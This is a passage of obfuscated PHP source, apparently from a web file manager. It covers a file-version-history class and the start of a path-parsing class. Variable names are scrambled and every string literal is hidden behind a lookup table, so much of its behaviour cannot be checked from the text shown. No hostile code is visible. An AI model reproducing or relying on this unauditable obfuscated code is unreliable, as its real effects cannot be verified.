(isset($_REQUEST[$È„“Õä¯[1355]]) && $_REQUEST[$È„“Õä¯[1355]] == $È„“Õä¯[102]) { return; } Hook::bind($È„“Õä¯[1356], $È„“Õä¯[1357]); Hook::bind($È„“Õä¯[1358], $È„“Õä¯[1359]); Hook::bind($È„“Õä¯[1360], $È„“Õä¯[1361]); Hook::bind($È„“Õä¯[1362], $È„“Õä¯[1363]); Hook::bind($È„“Õä¯[1364], $È„“Õä¯[1365]); Hook::bind($È„“Õä¯[1366], $È„“Õä¯[1367]); } public static function eventBeforeUpload($ßŸ Æâí) { if ($ßŸ Æâí[3] && $ßŸ Æâí[3] != REPEAT_REPLACE) { return; } $¬õøúÜ¯ = self::parsePath($ßŸ Æâí[0]); if (!$¬õøúÜ¯) { return; } self::add($¬õøúÜ¯); } public static function eventBeforeEdit($‘Ç±ƒÌÂ) { $¾İÜŸŸ‚ = self::parsePath($‘Ç±ƒÌÂ[0]); if (!$¾İÜŸŸ‚) { return; } self::add($¾İÜŸŸ‚); } public static function eventBeforeCopyFile($«Œ´ñí, $é¤®µ”¬, $¿êµ±ıã, $Ü–É‡¨Î, $ÂÔ•®Ş, $˜—ñøË†) { $÷Ì¢è›Ë =& $_SERVER[¤øïŠ‹²]; if (isset($¿êµ±ıã->_data[$÷Ì¢è›Ë[1287]]) && $¿êµ±ıã->_data[$÷Ì¢è›Ë[1287]]) { return; } $¤ßÇÔîÃ = $¿êµ±ıã->getPathOuter($Ü–É‡¨Î); $¡ÑìÜá = self::parsePath($¤ßÇÔîÃ); if (!$¡ÑìÜá) { return; } self::add($¡ÑìÜá); } public static function eventBeforeRename($©‚­±Í¾) { $õ­èèƒï =& $_SERVER[¤øïŠ‹²]; $ÚòÆñÙÜ = self::parsePath($©‚­±Í¾[0]); if (!$ÚòÆñÙÜ) { return; } $£¸«¦ˆ = self::checkInHistory($ÚòÆñÙÜ); if (!$£¸«¦ˆ) { return; } if ($£¸«¦ˆ[$õ­èèƒï[33]] == $õ­èèƒï[243]) { $³ñÎúŒ = self::listData($ÚòÆñÙÜ); if ($³ñÎúŒ && $³ñÎúŒ[$õ­èèƒï[457]]) { self::moveHistory($ÚòÆñÙÜ, $©‚­±Í¾[1]); } } else { IO::rename($£¸«¦ˆ[$õ­èèƒï[98]], $©‚­±Í¾[1]); } } public static function eventBeforeMove($ÂÍêˆàÂ) { $¤ñµ™óŠ =& $_SERVER[¤øïŠ‹²]; $ïç‡°úÅ = self::parsePath($ÂÍêˆàÂ[0]); if (!$ïç‡°úÅ) { return; } $ ‡æŒ¤Å = self::parsePath($ÂÍêˆàÂ[1]); if (!$ ‡æŒ¤Å) { return; } $ä‰£«òÌ = $ÂÍêˆàÂ[3]; $­·÷Ö„† = self::checkInHistory($ïç‡°úÅ); if (!$­·÷Ö„†) { return; } $ˆ”–¤¼× = self::pathHistory($ ‡æŒ¤Å); if ($­·÷Ö„†[$¤ñµ™óŠ[33]] == $¤ñµ™óŠ[243]) { $Óˆ¥¦ü = self::listData($ïç‡°úÅ); $ÌçºùÒ“ = rtrim($ ‡æŒ¤Å, $¤ñµ™óŠ[8]) . $¤ñµ™óŠ[8] . ($ä‰£«òÌ ? $ä‰£«òÌ : get_path_this($ïç‡°úÅ)); $ö™±Âíİ = self::listData($ÌçºùÒ“); if ($Óˆ¥¦ü && $Óˆ¥¦ü[$¤ñµ™óŠ[457]] && $ö™±Âíİ && $ö™±Âíİ[$¤ñµ™óŠ[457]]) { return self::clear($ïç‡°úÅ); } if ($Óˆ¥¦ü && $Óˆ¥¦ü[$¤ñµ™óŠ[457]]) { self::moveHistory($ïç‡°úÅ, $ä‰£«òÌ, $ˆ”–¤¼×); } } else { IO::move($­·÷Ö„†[$¤ñµ™óŠ[98]], $ˆ”–¤¼×, !1, $ä‰£«òÌ); self::clearEmptyFolder(IO::pathFather($­·÷Ö„†[$¤ñµ™óŠ[98]])); } } public static function eventAfterRemove($»“À–‘¿, $¸´§õŠ) { $Æß°áŠ =& $_SERVER[¤øïŠ‹²]; if (!$¸´§õŠ) { return; } $Ã“Ê—ÒË = self::parsePath($»“À–‘¿[0]); if (!$Ã“Ê—ÒË) { return; } $ûäñÆË = self::checkInHistory($Ã“Ê—ÒË); if (!$ûäñÆË) { return; } if ($ûäñÆË[$Æß°áŠ[33]] == $Æß°áŠ[243]) { $„æ€Ğƒ‘ = self::listData($Ã“Ê—ÒË, !1); if ($„æ€Ğƒ‘ && $„æ€Ğƒ‘[$Æß°áŠ[457]]) { self::clear($Ã“Ê—ÒË, !1); } } else { IO::remove($ûäñÆË[$Æß°áŠ[98]]); self::clearEmptyFolder(IO::pathFather($ûäñÆË[$Æß°áŠ[98]])); } } private static function checkInHistory($¯ĞšÍÇÕ) { $¬ÊĞ÷€ƒ = self::pathHistory($¯ĞšÍÇÕ); if (!IO::exist($¬ÊĞ÷€ƒ)) { $¬ÊĞ÷€ƒ .= $_SERVER[¤øïŠ‹²][1368]; } return IO::exist($¬ÊĞ÷€ƒ) ? IO::info($¬ÊĞ÷€ƒ) : !1; } private static function parsePath($œµÆ–Â¿) { $ìßÂñÚ =& $_SERVER[¤øïŠ‹²]; if (!$œµÆ–Â¿) { return !1; } if (isset($GLOBALS[$ìßÂñÚ[1369]]) && $GLOBALS[$ìßÂñÚ[1369]]) { return; } $Ö±ñ÷Æœ = KodIO::parse($œµÆ–Â¿); $šğº† = $Ö±ñ÷Æœ[$ìßÂñÚ[33]]; $ıš¼»ıæ = !$šğº† || $šğº† == KodIO::KOD_IO || $šğº† == KodIO::KOD_SHARE_ITEM; if (!$ıš¼»ıæ || !$Ö±ñ÷Æœ[$ìßÂñÚ[1370]]) { return !1; } if (substr($œµÆ–Â¿, 0, strlen(DATA_PATH . $ìßÂñÚ[1371])) == DATA_PATH . $ìßÂñÚ[1371]) { return !1; } if ($šğº† == KodIO::KOD_SHARE_ITEM) { $ª®·‘¦È = IO::init($œµÆ–Â¿); if ($ª®·‘¦È->pathParse[$ìßÂñÚ[1283]]) { return self::parsePath($ª®·‘¦È->pathParse[$ìßÂñÚ[1283]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $İ–ø×¬» = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $ìßÂñÚ[1372]); foreach ($İ–ø×¬» as $½Æ³˜á») { if (!$šğº† && substr($œµÆ–Â¿, 0, strlen($½Æ³˜á»)) == $½Æ³˜á») { return !1; } } self::log($GLOBALS[$ìßÂñÚ[1277]] . $ìßÂñÚ[1373] . $œµÆ–Â¿); return $œµÆ–Â¿; } private static function pathHistory($ÌŞõŒÀ») { $äô¦ª¶¯ =& $_SERVER[¤øïŠ‹²]; $Şè¨ÍÍ = self::$_historyBase . ltrim(KodIO::clear($ÌŞõŒÀ»), $äô¦ª¶¯[8]); $Şè¨ÍÍ = str_replace(array($äô¦ª¶¯[1374]), array($äô¦ª¶¯[1375]), $Şè¨ÍÍ); return $Şè¨ÍÍ; } public static function log($ĞÀğ¼™Ö) { } public static function historyCount($¾±³ÖÜ™) { $ãß±åÏ  =& $_SERVER[¤øïŠ‹²]; $ûôàñ² = array(); $ĞÛÛÎÎ• = array(); foreach ($¾±³ÖÜ™ as $Î±¦œ÷) { $º³”íê = get_path_father($Î±¦œ÷); if (!$ĞÛÛÎÎ•[$º³”íê]) { $ĞÛÛÎÎ•[$º³”íê] = array(); } $ĞÛÛÎÎ•[$º³”íê][] = get_path_this($Î±¦œ÷); } foreach ($ĞÛÛÎÎ• as $º³”íê => $—õ‰ïê‡) { $ØúÛó© = self::parsePath($º³”íê); if (!$ØúÛó©) { continue; } foreach ($—õ‰ïê‡ as $ïÑÈ†Ó) { $¹‚¥º‚› = self::listData(rtrim($ØúÛó©, $ãß±åÏ [8]) . $ãß±åÏ [8] . $ïÑÈ†Ó, !1); if ($¹‚¥º‚› && $¹‚¥º‚›[$ãß±åÏ [457]]) { $ûôàñ²[rtrim($º³”íê, $ãß±åÏ [8]) . $ãß±åÏ [8] . $ïÑÈ†Ó] = count($¹‚¥º‚›[$ãß±åÏ [457]]); } } } return $ûôàñ²; } public static function add($ôíÈè‹Ì) { $‰ŸÖÒÔ =& $_SERVER[¤øïŠ‹²]; $œÎÅß¨ = self::listData($ôíÈè‹Ì); if (!$œÎÅß¨) { return; } $ËŒÆÂ‰À = Model($‰ŸÖÒÔ[874])->get($‰ŸÖÒÔ[1376]); $°Ô‚øèË = intval($GLOBALS[$‰ŸÖÒÔ[6]][$‰ŸÖÒÔ[103]][$‰ŸÖÒÔ[1354]]); $ËÜÄ…­± = $ËŒÆÂ‰À == $‰ŸÖÒÔ[1377] ? min(5, $°Ô‚øèË) : $°Ô‚øèË; if ($°Ô‚øèË <= 0) { return; } $Ñá¨ = IO::info($ôíÈè‹Ì); $ˆ€Á¾§¸ = $œÎÅß¨[$‰ŸÖÒÔ[457]]; if ($Ñá¨[$‰ŸÖÒÔ[90]] == 0) { return; } if ($Ñá¨[$‰ŸÖÒÔ[90]] >= 1024 * 1024 * 500) { return !1; } $Ğ ñæåï = IO::hashSimple($ôíÈè‹Ì); if ($ˆ€Á¾§¸ && $ˆ€Á¾§¸[0][$‰ŸÖÒÔ[701]] == $Ğ ñæåï) { return !0; } if (array_key_exists($‰ŸÖÒÔ[246], $Ñá¨) && !$Ñá¨[$‰ŸÖÒÔ[246]]) { return !1; } $Ó»ÌıÕË = short_id(time()); $Á•Óµ¼¿ = array($‰ŸÖÒÔ[493] => $Ó»ÌıÕË, $‰ŸÖÒÔ[701] => $Ğ ñæåï, $‰ŸÖÒÔ[32] => $Ñá¨[$‰ŸÖÒÔ[32]] . $‰ŸÖÒÔ[10] . date($‰ŸÖÒÔ[1378]) . rand_string(1), $‰ŸÖÒÔ[90] => $Ñá¨[$‰ŸÖÒÔ[90]], $‰ŸÖÒÔ[547] => USER_ID, $‰ŸÖÒÔ[244] => time(), $‰ŸÖÒÔ[1379] => $‰ŸÖÒÔ[12]); IO::mkdir($œÎÅß¨[$‰ŸÖÒÔ[1380]]); $ÇÂÏÆ‰Ğ = IO::copy($ôíÈè‹Ì, $œÎÅß¨[$‰ŸÖÒÔ[1380]], !1, $Á•Óµ¼¿[$‰ŸÖÒÔ[32]]); if (!$ÇÂÏÆ‰Ğ) { self::clearEmptyFolder($œÎÅß¨[$‰ŸÖÒÔ[1380]]); return !1; } array_unshift($ˆ€Á¾§¸, $Á•Óµ¼¿); if (count($ˆ€Á¾§¸) > $ËÜÄ…­±) { $§ü’·€î = array_slice($ˆ€Á¾§¸, $ËÜÄ…­±); foreach ($§ü’·€î as $ƒíÈı) { IO::remove($œÎÅß¨[$‰ŸÖÒÔ[1380]] . $ƒíÈı[$‰ŸÖÒÔ[32]]); } $ˆ€Á¾§¸ = array_slice($ˆ€Á¾§¸, 0, $ËÜÄ…­±); } return self::saveData($œÎÅß¨[$‰ŸÖÒÔ[1381]], $ˆ€Á¾§¸); } public static function remove($Ûê¯ÄÉ¨, $×Í»¹…„) { $Ÿ¿›ıÚ§ =& $_SERVER[¤øïŠ‹²]; $×Ñö½å« = self::listData($Ûê¯ÄÉ¨); $Ÿ‰üÈË = array(); if (!$×Ñö½å«) { return !1; } foreach ($×Ñö½å«[$Ÿ¿›ıÚ§[457]] as $¯äİ¨½µ) { if ($¯äİ¨½µ[$Ÿ¿›ıÚ§[493]] == $×Í»¹…„) { IO::remove($×Ñö½å«[$Ÿ¿›ıÚ§[1380]] . $¯äİ¨½µ[$Ÿ¿›ıÚ§[32]]); continue; } $Ÿ‰üÈË[] = $¯äİ¨½µ; } return self::saveData($×Ñö½å«[$Ÿ¿›ıÚ§[1381]], $Ÿ‰üÈË); } public static function clear($íîë€™, $úõßü = true) { $¸ ‘ŸØ“ =& $_SERVER[¤øïŠ‹²]; $ÇØæÙ¿İ = self::listData($íîë€™, $úõßü); if (!$ÇØæÙ¿İ) { return !1; } foreach ($ÇØæÙ¿İ[$¸ ‘ŸØ“[457]] as $ûÅ’§ÙÜ) { IO::remove($ÇØæÙ¿İ[$¸ ‘ŸØ“[1380]] . $ûÅ’§ÙÜ[$¸ ‘ŸØ“[32]]); } return self::saveData($ÇØæÙ¿İ[$¸ ‘ŸØ“[1381]], array()); } public static function moveHistory($¢ÍËöŠµ, $®ª«äê± = '', $¸ŠúÈ¤ = '') { $á˜–‹¡Ú =& $_SERVER[¤øïŠ‹²]; $ûî¼‘Ÿ = self::listData($¢ÍËöŠµ, !1); if (!$ûî¼‘Ÿ || !$ûî¼‘Ÿ[$á˜–‹¡Ú[457]]) { return !1; } $ï‰„øª† = $á˜–‹¡Ú[1368]; $®ª«äê± = $®ª«äê± ? $®ª«äê± : get_path_this($¢ÍËöŠµ); $¸ŠúÈ¤ = $¸ŠúÈ¤ ? $¸ŠúÈ¤ : $ûî¼‘Ÿ[$á˜–‹¡Ú[1380]]; $ë˜“—èù = substr(get_path_this($ûî¼‘Ÿ[$á˜–‹¡Ú[1381]]), 0, -strlen($ï‰„øª†)); foreach ($ûî¼‘Ÿ[$á˜–‹¡Ú[457]] as $·’ÏüâÍ => $ºí¿§î) { $ÔÅº¤“ = $®ª«äê± . substr($ºí¿§î[$á˜–‹¡Ú[32]], strlen($ë˜“—èù)); $ñ•º˜Ğñ = IO::move($ûî¼‘Ÿ[$á˜–‹¡Ú[1380]] . $ºí¿§î[$á˜–‹¡Ú[32]], $¸ŠúÈ¤, !1, $ÔÅº¤“); if ($ñ•º˜Ğñ) { $ûî¼‘Ÿ[$á˜–‹¡Ú[457]][$·’ÏüâÍ][$á˜–‹¡Ú[32]] = $ÔÅº¤“; } } $ûî¼‘Ÿ[$á˜–‹¡Ú[1381]] = IO::move($ûî¼‘Ÿ[$á˜–‹¡Ú[1381]], $¸ŠúÈ¤, !1, $®ª«äê± . $ï‰„øª†); self::saveData($ûî¼‘Ÿ[$á˜–‹¡Ú[1381]], $ûî¼‘Ÿ[$á˜–‹¡Ú[457]]); self::clearEmptyFolder($ûî¼‘Ÿ[$á˜–‹¡Ú[1380]]); } public static function rollback($—Íîòª, $ıÀÕ‹ÒŸ) { $¤Äçµ®Õ =& $_SERVER[¤øïŠ‹²]; $øŞ°üö = self::listData($—Íîòª); if (!$øŞ°üö) { return; } $ßéêüì = IO::info($—Íîòª); foreach ($øŞ°üö[$¤Äçµ®Õ[457]] as $–æ¦³ñÜ => $â€‘ââÑ) { if ($â€‘ââÑ[$¤Äçµ®Õ[493]] == $ıÀÕ‹ÒŸ) { self::add($—Íîòª); $˜¡ü™ëğ = $øŞ°üö[$¤Äçµ®Õ[1380]] . $â€‘ââÑ[$¤Äçµ®Õ[32]]; $ÄÎ³Àş = IO::copy($˜¡ü™ëğ, IO::pathFather($—Íîòª), REPEAT_REPLACE, $ßéêüì[$¤Äçµ®Õ[32]]); if ($ÄÎ³Àş) { self::remove($—Íîòª, $ıÀÕ‹ÒŸ); } return $ÄÎ³Àş; } } return !1; } public static function setDetail($øº¹ØÆ×, $î¥—÷³“, $Ú¾ˆ¥) { $«ÛÑšÆ =& $_SERVER[¤øïŠ‹²]; $Œ•íß­ø = self::listData($øº¹ØÆ×); if (!$Œ•íß­ø) { return; } foreach ($Œ•íß­ø[$«ÛÑšÆ[457]] as $šÁÇç¦ => $µ«±£òœ) { if ($µ«±£òœ[$«ÛÑšÆ[493]] == $î¥—÷³“) { $Œ•íß­ø[$«ÛÑšÆ[457]][$šÁÇç¦][$«ÛÑšÆ[1379]] = $Ú¾ˆ¥; self::saveData($Œ•íß­ø[$«ÛÑšÆ[1381]], $Œ•íß­ø[$«ÛÑšÆ[457]]); return !0; } } return !1; } public static function fileInfo($‘ôüÌ„, $åï¯ñÎÜ) { $ØÖîäƒ’ =& $_SERVER[¤øïŠ‹²]; $¶Ü®‘ˆ£ = self::listData($‘ôüÌ„); if (!$¶Ü®‘ˆ£) { show_json(LNG($ØÖîäƒ’[117]), !1); } $Â¶ÀæèÑ = $ØÖîäƒ’[12]; foreach ($¶Ü®‘ˆ£[$ØÖîäƒ’[457]] as $®ÖÙâÁ– => $Ÿô¶Ù×Ÿ) { if ($Ÿô¶Ù×Ÿ[$ØÖîäƒ’[493]] != $åï¯ñÎÜ) { continue; } $Â¶ÀæèÑ = $¶Ü®‘ˆ£[$ØÖîäƒ’[1380]] . $Ÿô¶Ù×Ÿ[$ØÖîäƒ’[32]]; break; } if (!$Â¶ÀæèÑ) { show_json(LNG($ØÖîäƒ’[117]), !1); } return IO::info($Â¶ÀæèÑ); } public static function fileOut($èŞÌ·, $ëêÎ‚Ó’, $›ø¬·äú = false) { $¿Ş´ŒÉ =& $_SERVER[¤øïŠ‹²]; $Üù˜© = self::fileInfo($èŞÌ·, $ëêÎ‚Ó’); $úŒ¶Åä§ =& $GLOBALS[$¿Ş´ŒÉ[7]]; $›ø¬·äú = isset($úŒ¶Åä§[$¿Ş´ŒÉ[1331]]) && $úŒ¶Åä§[$¿Ş´ŒÉ[1331]] == 1; if (isset($úŒ¶Åä§[$¿Ş´ŒÉ[33]]) && $úŒ¶Åä§[$¿Ş´ŒÉ[33]] == $¿Ş´ŒÉ[1382]) { return IO::fileOutImage($Üù˜©[$¿Ş´ŒÉ[98]], $úŒ¶Åä§[$¿Ş´ŒÉ[1383]]); } IO::fileOut($Üù˜©[$¿Ş´ŒÉ[98]], $›ø¬·äú, get_path_this($èŞÌ·)); } public static function listData($¤÷ˆ½ã, $£§ÊÎ = true) { $ì¸ì†…ó =& $_SERVER[¤øïŠ‹²]; if ($£§ÊÎ && !IO::exist($¤÷ˆ½ã)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($¤÷ˆ½ã, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $‹ò—¨Ï— = self::pathHistory($¤÷ˆ½ã); $ĞÕ»ÇÁÄ = array($ì¸ì†…ó[1381] => $‹ò—¨Ï— . $ì¸ì†…ó[1368], $ì¸ì†…ó[1380] => rtrim(get_path_father($‹ò—¨Ï—), $ì¸ì†…ó[8]) . $ì¸ì†…ó[8], $ì¸ì†…ó[457] => array()); $õ»„›Ùš = IO::getContent($ĞÕ»ÇÁÄ[$ì¸ì†…ó[1381]]); if ($õ»„›Ùš) { $ªóÍ™ˆœ = json_decode($õ»„›Ùš, !0); if (is_array($ªóÍ™ˆœ)) { $ĞÕ»ÇÁÄ[$ì¸ì†…ó[457]] = $ªóÍ™ˆœ; } } return $ĞÕ»ÇÁÄ; } private static function saveData($İµÌ‹ÉÕ, $ìæùØ´§) { $°Ëá˜ÕÉ =& $_SERVER[¤øïŠ‹²]; self::log($°Ëá˜ÕÉ[1384] . $İµÌ‹ÉÕ . $°Ëá˜ÕÉ[85] . count($ìæùØ´§), $°Ëá˜ÕÉ[853]); if ($ìæùØ´§) { return IO::setContent($İµÌ‹ÉÕ, json_encode($ìæùØ´§)); } $”ƒÁá°¼ = IO::pathFather($İµÌ‹ÉÕ); IO::remove($İµÌ‹ÉÕ); self::clearEmptyFolder($”ƒÁá°¼); return !0; } public static function clearEmptyFolder($Ğ¨º·Æ÷) { $®ÁÍÔ¡Ô =& $_SERVER[¤øïŠ‹²]; if (trim($Ğ¨º·Æ÷, $®ÁÍÔ¡Ô[8]) == trim(self::$_historyBase, $®ÁÍÔ¡Ô[8])) { return; } $Æâ¢ˆÊ¾ = IO::pathFather($Ğ¨º·Æ÷); $”³íõ× = IO::has($Ğ¨º·Æ÷, !0); if ($”³íõ×[$®ÁÍÔ¡Ô[252]] > 0 || $”³íõ×[$®ÁÍÔ¡Ô[253]] > 0) { return; } IO::remove($Ğ¨º·Æ÷); self::clearEmptyFolder($Æâ¢ˆÊ¾); } private static function getBasePath() { $½ôöÇƒÎ =& $_SERVER[¤øïŠ‹²]; $Ü…˜ä¿Õ = Model($½ôöÇƒÎ[1385])->get($½ôöÇƒÎ[1386]); if ($Ü…˜ä¿Õ) { if (!IO::exist($Ü…˜ä¿Õ)) { IO::mkdir($Ü…˜ä¿Õ); } if (get_path_this($Ü…˜ä¿Õ) == $½ôöÇƒÎ[1371]) { $Ú­Š¦ƒÊ = $½ôöÇƒÎ[1387] . rand_string(8); @rename($Ü…˜ä¿Õ, get_path_father($Ü…˜ä¿Õ) . $½ôöÇƒÎ[8] . $Ú­Š¦ƒÊ); $Ü…˜ä¿Õ = DATA_PATH . $Ú­Š¦ƒÊ . $½ôöÇƒÎ[8]; file_put_contents(DATA_PATH . $½ôöÇƒÎ[1319], $½ôöÇƒÎ[12]); Model($½ôöÇƒÎ[1385])->set($½ôöÇƒÎ[1386], $Ü…˜ä¿Õ); } return $Ü…˜ä¿Õ; } $Ü…˜ä¿Õ = DATA_PATH . $½ôöÇƒÎ[1387] . rand_string(8) . $½ôöÇƒÎ[8]; $Ü…˜ä¿Õ = IO::mkdir($Ü…˜ä¿Õ); $Ü…˜ä¿Õ = rtrim($Ü…˜ä¿Õ, $½ôöÇƒÎ[8]) . $½ôöÇƒÎ[8]; file_put_contents($Ü…˜ä¿Õ . $½ôöÇƒÎ[1319], $½ôöÇƒÎ[12]); file_put_contents(DATA_PATH . $½ôöÇƒÎ[1319], $½ôöÇƒÎ[12]); Model($½ôöÇƒÎ[1385])->set($½ôöÇƒÎ[1386], $Ü…˜ä¿Õ); return $Ü…˜ä¿Õ; } } class KodIO { const KOD_SOURCE = "\173\x73\157\165\162\143\x65\x7d"; const KOD_USER_RECYCLE = "\173\x75\x73\145\x72\x52\145\143\x79\x63\154\x65\175"; const KOD_USER_FAV = "\x7b\x75\x73\145\x72\x46\x61\x76\x7d"; const KOD_USER_FILE_TAG = "\173\x75\163\x65\x72\106\x69\x6c\x65\x54\x61\x67\x7d"; const KOD_USER_FILE_TYPE = "\x7b\165\x73\x65\x72\106\151\154\145\x54\x79\160\145\x7d"; const KOD_GROUP_ROOT_SELF = "\x7b\x67\x72\x6f\165\160\x52\157\x6f\164\x53\145\154\146\x7d"; const KOD_USER_SHARE = "\x7b\x75\x73\x65\x72\x53\x68\x61\162\145\x7d"; const KOD_USER_SHARE_LINK = "\x7b\x75\163\145\x72\123\x68\141\162\x65\x4c\151\156\x6b\175"; const KOD_USER_SHARE_TO_ME = "\173\x73\150\x61\162\145\x54\x6f\115\x65\x7d"; const KOD_SHARE_ITEM = "\173\x73\x68\141\162\x65\111\x74\x65\x6d\x7d"; const KOD_SHARE_LINK = "\173\x73\150\141\162\x65\x49\x74\x65\155\x4c\151\156\x6b\175"; const KOD_SHARE_OUTER = "\173\x73\x68\141\162\x65\x49\x74\145\155\x4f\x75\164\175"; const KOD_SEARCH = "\x7b\x73\x65\141\162\143\x68\175"; const KOD_BLOCK = "\x7b\x62\x6c\157\x63\153\x7d"; const KOD_IO = "\173\x69\157\x7d"; const KOD_USER_RECENT = "\173\165\163\145\x72\x52\145\x6e\x63\145\x6e\x74\175"; const KOD_USER_DRIVER = "\173\144\162\x69\x76\x65\162\x7d"; public static function typeList() { $ŸÁéğúÀ =& $_SERVER[¤øïŠ‹²]; return array($ŸÁéğúÀ[1388] => self::KOD_SOURCE, $ŸÁéğúÀ[1389] => self::KOD_USER_RECYCLE, $ŸÁéğúÀ[1390] => self::KOD_USER_FAV, $ŸÁéğúÀ[1391] => self::KOD_USER_FILE_TAG, $ŸÁéğúÀ[1392] => self::KOD_USER_FILE_TYPE, $ŸÁéğúÀ[1393] => self::KOD_GROUP_ROOT_SELF, $ŸÁéğúÀ[1394] => self::KOD_USER_SHARE, $ŸÁéğúÀ[1395] => self::KOD_USER_SHARE_LINK, $ŸÁéğúÀ[1396] => self::KOD_USER_SHARE_TO_ME, $ŸÁéğúÀ[1397] => self::KOD_SHARE_ITEM, $ŸÁéğúÀ[1398] => self::KOD_SHARE_LINK, $ŸÁéğúÀ[1399] => self::KOD_SHARE_OUTER, $ŸÁéğúÀ[1400] => self::KOD_SEARCH, $ŸÁéğúÀ[1401] => self::KOD_BLOCK, $ŸÁéğúÀ[1402] => self::KOD_IO, $ŸÁéğúÀ[1403] => self::KOD_USER_RECENT, $ŸÁéğúÀ[1404] => self::KOD_USER_DRIVER); } public static function parse($®½²…Ó×) { $æÍ¼ïêŸ =& $_SERVER[¤øïŠ‹²]; $®½²…Ó× = self::clear($®½²…Ó×); $êÚèÅŞª = array_values(self::typeList()); preg_match($æÍ¼ïêŸ[1405], $®½²…Ó×, $âÍÑè); $°Êèèœ± = array($æÍ¼ïêŸ[517] => !1, $æÍ¼ïêŸ[1406] => !1, $æÍ¼ïêŸ[514] => !1, $æÍ¼ïêŸ[98] => $®½²…Ó×, $æÍ¼ïêŸ[1303] => !1, $æÍ¼ïêŸ[1302] => $æÍ¼ïêŸ[12]); if (is_array($âÍÑè) && count($âÍÑè) == 5) { $Óˆ®´Û = $æÍ¼ïêŸ[1407] . $âÍÑè[2] . $æÍ¼ïêŸ[414]; if (in_array($Óˆ®´Û, $êÚèÅŞª)) { $°Êèèœ±[$æÍ¼ïêŸ[1303]] = $âÍÑè[1]; $°Êèèœ±[$æÍ¼ïêŸ[33]] = $Óˆ®´Û; $°Êèèœ±[$æÍ¼ïêŸ[1408]] = substr($Óˆ®´Û, 1, -1); $°Êèèœ±[$æÍ¼ïêŸ[493]] = $âÍÑè[3]; } $°Êèèœ±[$æÍ¼ïêŸ[1302]] = $âÍÑè[4]; } if ($°Êèèœ±[$æÍ¼ïêŸ[517]] == self::KOD_SOURCE) { $°Êèèœ±[$æÍ¼ïêŸ[493]] = intval($°Êèèœ±[$æÍ¼ïêŸ[493]]); $°Êèèœ±[$æÍ¼ïêŸ[1306]] = $°Êèèœ±[$æÍ¼ïêŸ[493]]; } $ ÂòÜÌ¡ = array($æÍ¼ïêŸ[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_SHARE_OUTER, self::KOD_USER_DRIVER); $°Êèèœ±[$æÍ¼ïêŸ[1370]] = in_array($°Êèèœ±[$æÍ¼ïêŸ[33]], $ ÂòÜÌ¡); return $°Êèèœ±; } public static function isTruePath($—÷á°’‚) { $Îîö×±¯ =& $_SERVER[¤øïŠ‹²]; if (substr($—÷á°’‚, 0, 1) != $Îîö×±¯[1407]) { return !0; } if (strpos($—÷á°’‚, $Îîö×±¯[504]) === 0) { return !0; } if (strpos($—÷á°’‚, $Îîö×±¯[1374]) === 0) { return !0; } if (strpos($—÷á°’‚, $Îîö×±¯[1409]) === 0) { return !0; } if (strpos($—÷á°’‚, $Îîö×±¯[1410]) === 0) { return !0; } if (strpos($—÷á°’‚, $Îîö×±¯[1411]) === 0) { return !0; } if (strpos($—÷á°’‚, $Îîö×±¯[1412]) === 0) { return !0; } return !1; } public static function clear($Òö–µ¢õ) { $íªƒç©× =& $_SERVER[¤øïŠ‹²]; $Òö–µ¢õ = str_replace(array($íªƒç©×[1196], $íªƒç©×[59]), $íªƒç©×[53], $Òö–µ¢õ); $Òö–µ¢õ = str_replace($íªƒç©×[109], $íªƒç©×[8], $Òö–µ¢õ); $ù•–˜Ä¼ = $íªƒç©×[1413]; if (substr($Òö–µ¢õ, 0, 3) == $íªƒç©×[1414]) { $Òö–µ¢õ = substr($Òö–µ¢õ, 3); } while (strstr($Òö–µ¢õ, $ù•–˜Ä¼)) { $Òö–µ¢õ = str_replace($ù•–˜Ä¼, $íªƒç©×[8], $Òö–µ¢õ); } $Òö–µ¢õ = preg_replace($íªƒç©×[1415], $íªƒç©×[8], $Òö–µ¢õ); if ($Òö–µ¢õ == $íªƒç©×[8]) { return $íªƒç©×[8]; } $Òö–µ¢õ = rtrim($Òö–µ¢õ, $íªƒç©×[8]); return $Òö–µ¢õ; } public static function pathTrue($âŞ²¥Ö‹) { $œëøïËÖ =& $_SERVER[¤øïŠ‹²]; if (!$âŞ²¥Ö‹) { return $œëøïËÖ[12]; } $âŞ²¥Ö‹ = str_replace($œëøïËÖ[267], $œëøïËÖ[8], str_replace($œëøïËÖ[1416], $œëøïËÖ[8], $âŞ²¥Ö‹)); $âŞ²¥Ö‹ = str_replace($œëøïËÖ[267], $œëøïËÖ[8], str_replace($œëøïËÖ[1416], $œëøïËÖ[8], $âŞ²¥Ö‹)); if (!strstr($âŞ²¥Ö‹, $œëøïËÖ[1414])) { return $âŞ²¥Ö‹; } $¯Á¢“÷ = explode($œëøïËÖ[8], $âŞ²¥Ö‹); foreach ($¯Á¢“÷ as $êƒÊÎ†ä => $ü¤›»©) { if ($ü¤›»© !== $œëøïËÖ[1417]) { continue; } for ($êâ¤¸…ô = $êƒÊÎ†ä; $êâ¤¸…ô >= 0; $êâ¤¸…ô--) { if ($¯Á¢“÷[$êâ¤¸…ô] === $œëøïËÖ[10] || $¯Á¢“÷[$êâ¤¸…ô] === $œëøïËÖ[1417] || $¯Á¢“÷[$êâ¤¸…ô] === -1) { continue; } if ($¯Á¢“÷[$êâ¤¸…ô] === $œëøïËÖ[12]) { $¯Á¢“÷[$êƒÊÎ†ä] = -1; break; } $¯Á¢“÷[$êƒÊÎ†ä] = -1; $¯Á¢“÷[$êâ¤¸…ô] = -1; break; } } $ºÈ™Àì± = array(); foreach ($¯Á¢“÷ as $ü¤›»©) { if ($ü¤›»© !== -1) { $ºÈ™Àì±[] = $ü¤›»©; } } $ãö©´Õ = implode($œëøïËÖ[8], $ºÈ™Àì±); if (strpos($ãö©´Õ, $œëøïËÖ[1418]) === 0) { $ãö©´Õ = $œëøïËÖ[1414] . substr($ãö©´Õ, strlen($œëøïËÖ[1418])); } return $ãö©´Õ; } public static function pathUrlClear($É²Ò™ˆ¥) { $‹‚ºç¨× =& $_SERVER[¤øïŠ‹²]; if (!$É²Ò™ˆ¥) { return $É²Ò™ˆ¥; } $É²Ò™ˆ¥ = rawurldecode($É²Ò™ˆ¥); $É²Ò™ˆ¥ = 